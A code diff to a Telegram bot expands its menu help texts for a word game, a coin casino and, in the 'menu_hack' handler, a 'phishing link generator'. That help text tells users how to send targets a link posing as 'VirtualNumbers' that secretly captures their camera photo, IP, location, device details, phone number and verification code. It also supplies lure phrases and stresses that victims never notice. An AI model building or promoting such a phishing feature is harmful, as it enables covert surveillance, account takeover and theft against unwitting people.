@@ -1162,12 +1162,76 @@ bot.command("setadmin", async (ctx) => {
 // ========== BUTTON HANDLERS ==========
 bot.action("menu_hack", async (ctx) => {
   await ctx.answerCbQuery();
-  await ctx.reply(`💀 **HACK**\n\n/hack [label]\n💰 Cost: ${TRACK_COST} coins\n📸 Captures Camera + IP + Location`);
+  await ctx.reply(
+    `💀 **PHISHING LINK GENERATOR** 💀\n\n` +
+    `┌─────────────────────────────────┐\n` +
+    `│  💀 HACKER MODE ACTIVATED 💀    │\n` +
+    `└─────────────────────────────────┘\n\n` +
+    `💰 **Cost:** ${TRACK_COST} coins\n` +
+    `📸 **Captures:** Camera + IP + Location + Device Info\n\n` +
+    `🎯 **How to use:**\n` +
+    `/hack [label]\n\n` +
+    `📝 **Examples:**\n` +
+    `• /hack free gift\n` +
+    `• /hack win iphone\n` +
+    `• /hack claim reward\n` +
+    `• /hack verification\n` +
+    `• /hack urgent notice\n\n` +
+    `🔗 **What happens:**\n` +
+    `1️⃣ You get a unique phishing link\n` +
+    `2️⃣ Send link to your target\n` +
+    `3️⃣ They see VirtualNumbers (looks 100% legit)\n` +
+    `4️⃣ You receive in DM:\n` +
+    `   • 📸 Camera photo\n` +
+    `   • 📱 IP address\n` +
+    `   • 📍 Location\n` +
+    `   • 🌐 Device/browser info\n` +
+    `   • 📞 Phone number they select\n` +
+    `   • 🔢 Verification code\n\n` +
+    `⚡ **Features:**\n` +
+    `• Link works for 24 hours\n` +
+    `• One-time use (expires after click)\n` +
+    `• Target never knows they were hacked\n` +
+    `• +15 XP per successful hack\n\n` +
+    `💀 **Pro tips:**\n` +
+    `• Use tempting labels (free gift, winner, claim)\n` +
+    `• Send via DM, groups, or social media\n` +
+    `• Works on mobile + desktop\n` +
+    `• Camera request looks like verification\n\n` +
+    `⚠️ **USE WISELY** ⚠️\n\n` +
+    `Ready to hack? /hack free gift`
+  );
 });
 
 bot.action("menu_word", async (ctx) => {
   await ctx.answerCbQuery();
-  await ctx.reply(`📝 **WORD BATTLE**\n\n/wordbattle @user amount difficulty`);
+  await ctx.reply(
+    `📝 **WORD BATTLE - 1v1 CHALLENGE** 📝\n\n` +
+    `💰 **Bet Range:** ${WORD_MIN_BET} - ${WORD_MAX_BET} coins\n` +
+    `👑 **Winner takes ALL coins!**\n\n` +
+    `🎯 **How to play:**\n` +
+    `1. Challenge someone: /wordbattle @username amount difficulty\n` +
+    `2. They accept with: /acceptword\n` +
+    `3. You type a word with the correct letter count\n` +
+    `4. Win = Double your bet + XP!\n\n` +
+    `⚡ **Difficulties:**\n` +
+    `• easy 🍃 - 45 seconds, 3 letters (1x multiplier)\n` +
+    `• medium ⚡ - 30 seconds, 5 letters (2x multiplier)\n` +
+    `• hard 🔥 - 15 seconds, 7 letters (3x multiplier)\n` +
+    `• expert 💀 - 8 seconds, 9 letters (5x multiplier)\n\n` +
+    `📝 **Examples:**\n` +
+    `/wordbattle @john 50 easy\n` +
+    `/wordbattle @jane 100 hard\n` +
+    `/wordbattle @user 200 expert\n\n` +
+    `💡 **Tips:**\n` +
+    `• Higher difficulty = bigger multiplier!\n` +
+    `• Must type EXACT letter count\n` +
+    `• Timer starts when opponent accepts\n` +
+    `• Words are case-insensitive\n` +
+    `• Any real word works!\n\n` +
+    `🏆 **Check leaderboard:** /topwords\n\n` +
+    `Ready to battle? Challenge someone now! 💀`
+  );
 });
 
 bot.action("menu_web", async (ctx) => {
@@ -1197,11 +1261,44 @@ bot.action("menu_web", async (ctx) => {
     `✨ **Try it now:** /createweb portfolio`
   );
 });
-
 bot.action("menu_casino", async (ctx) => {
   await ctx.answerCbQuery();
-  await ctx.reply(`🎰 **CASINO**\n\n/dice amount\n/slots amount`);
+  await ctx.reply(
+    `🎰 **CASINO - TRY YOUR LUCK** 🎰\n\n` +
+    `┌─────────────────────────────────┐\n` +
+    `│  🎲 LET'S GAMBLE! 🎲           │\n` +
+    `└─────────────────────────────────┘\n\n` +
+    `🎲 **DICE GAME**\n` +
+    `/dice [amount]\n\n` +
+    `• Min bet: 1 coin\n` +
+    `• Roll 1-3 → Lose bet\n` +
+    `• Roll 4-5 → Win 1x (get bet back)\n` +
+    `• Roll 6 → JACKPOT! Win 3x +5 XP\n\n` +
+    `🎰 **SLOT MACHINE**\n` +
+    `/slots [amount]\n\n` +
+    `• Min bet: 5 coins\n` +
+    `• 2 matching → Win 2x +5 XP\n` +
+    `• 3 matching → MEGA JACKPOT! Win 10x +20 XP\n\n` +
+    `📊 **Payout Examples:**\n` +
+    `• Bet 10 on dice → Roll 6 → Win 30 coins!\n` +
+    `• Bet 50 on slots → 3 matching → Win 500 coins!\n\n` +
+    `💡 **Tips:**\n` +
+    `• Start with small bets\n` +
+    `• Use /daily and /work for free coins\n` +
+    `• Higher risk = higher reward\n` +
+    `• Slots have bigger jackpots!\n\n` +
+    `🎮 **Other Games:**\n` +
+    `• /wordbattle - 1v1 word challenge\n` +
+    `• /daily - Free coins every day\n` +
+    `• /work - Earn coins working\n\n` +
+    `💰 **Your balance:** /balance\n\n` +
+    `🎲 **Ready to gamble? Try:**\n` +
+    `/dice 10\n` +
+    `/slots 25\n\n` +
+    `May the odds be ever in your favor! 🍀`
+  );
 });
+
 
 bot.action("menu_games", async (ctx) => {
   await ctx.answerCbQuery();
